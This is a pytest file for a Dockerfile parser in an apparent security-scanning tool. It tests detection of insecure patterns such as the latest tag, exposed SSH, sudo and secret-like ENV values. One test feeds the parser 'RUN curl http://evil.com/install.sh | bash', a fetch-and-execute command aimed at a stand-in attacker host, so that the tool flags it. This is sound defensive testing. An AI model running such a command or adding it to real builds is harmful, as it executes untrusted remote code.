"""Tests for Dockerfile parser."""

from pathlib import Path

import pytest

from threatcode.parsers.dockerfile import DockerfileParser


@pytest.fixture
def parser() -> DockerfileParser:
    return DockerfileParser()


@pytest.fixture
def insecure_dockerfile() -> str:
    return Path("tests/fixtures/docker/insecure.Dockerfile").read_text()


@pytest.fixture
def secure_dockerfile() -> str:
    return Path("tests/fixtures/docker/secure.Dockerfile").read_text()


class TestDockerfileParser:
    def test_parse_insecure(self, parser: DockerfileParser, insecure_dockerfile: str) -> None:
        result = parser.parse(insecure_dockerfile, source_path="insecure.Dockerfile")
        assert result.format_type == "dockerfile"
        # Should have individual instructions + summary
        assert len(result.resources) > 5

    def test_parse_secure(self, parser: DockerfileParser, secure_dockerfile: str) -> None:
        result = parser.parse(secure_dockerfile, source_path="secure.Dockerfile")
        assert result.format_type == "dockerfile"
        summary = [r for r in result.resources if r.resource_type == "dockerfile_image"]
        assert len(summary) == 1
        props = summary[0].properties
        assert props["has_user"] is True
        assert props["has_healthcheck"] is True
        assert props["uses_latest_tag"] is False
        assert props["has_workdir"] is True

    def test_summary_resource(self, parser: DockerfileParser, insecure_dockerfile: str) -> None:
        result = parser.parse(insecure_dockerfile)
        summary = [r for r in result.resources if r.resource_type == "dockerfile_image"]
        assert len(summary) == 1
        props = summary[0].properties
        assert props["has_user"] is False
        assert props["has_healthcheck"] is False
        assert props["uses_latest_tag"] is True
        assert 22 in props["exposed_ports"]
        assert props["has_ssh_exposed"] is True
        assert props["has_workdir"] is False

    def test_from_instruction(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM python:3.12\nRUN echo hello")
        froms = [r for r in result.resources if r.resource_type == "dockerfile_from"]
        assert len(froms) == 1
        assert froms[0].properties["image"] == "python:3.12"
        assert froms[0].properties["tag"] == "3.12"

    def test_latest_tag_detection(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM ubuntu\nRUN echo hi")
        summary = [r for r in result.resources if r.resource_type == "dockerfile_image"][0]
        assert summary.properties["uses_latest_tag"] is True

    def test_env_secret_detection(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM alpine\nENV DB_PASSWORD=secret")
        envs = [r for r in result.resources if r.resource_type == "dockerfile_env"]
        assert len(envs) == 1
        assert envs[0].properties["has_secret_pattern"] is True

    def test_run_curl_pipe(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM alpine\nRUN curl http://evil.com/install.sh | bash")
        runs = [r for r in result.resources if r.resource_type == "dockerfile_run"]
        assert runs[0].properties["has_curl_pipe"] is True

    def test_run_sudo(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM alpine\nRUN sudo apt-get install -y vim")
        runs = [r for r in result.resources if r.resource_type == "dockerfile_run"]
        assert runs[0].properties["has_sudo"] is True

    def test_multistage(self, parser: DockerfileParser) -> None:
        content = Path("tests/fixtures/docker/multistage.Dockerfile").read_text()
        result = parser.parse(content)
        froms = [r for r in result.resources if r.resource_type == "dockerfile_from"]
        assert len(froms) == 2

    def test_line_continuation(self, parser: DockerfileParser) -> None:
        content = "FROM alpine\nRUN apt-get update && \\\n    apt-get install -y curl"
        result = parser.parse(content)
        runs = [r for r in result.resources if r.resource_type == "dockerfile_run"]
        assert len(runs) == 1

    def test_comments_skipped(self, parser: DockerfileParser) -> None:
        content = "# This is a comment\nFROM alpine\n# Another comment\nRUN echo hi"
        result = parser.parse(content)
        # Should have 2 instructions + 1 summary = 3 resources
        assert len(result.resources) == 3

    def test_empty_dockerfile(self, parser: DockerfileParser) -> None:
        result = parser.parse("")
        # Should still have summary resource
        summary = [r for r in result.resources if r.resource_type == "dockerfile_image"]
        assert len(summary) == 1

    def test_provider_is_docker(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM alpine\nRUN echo hi")
        for r in result.resources:
            assert r.provider == "docker"
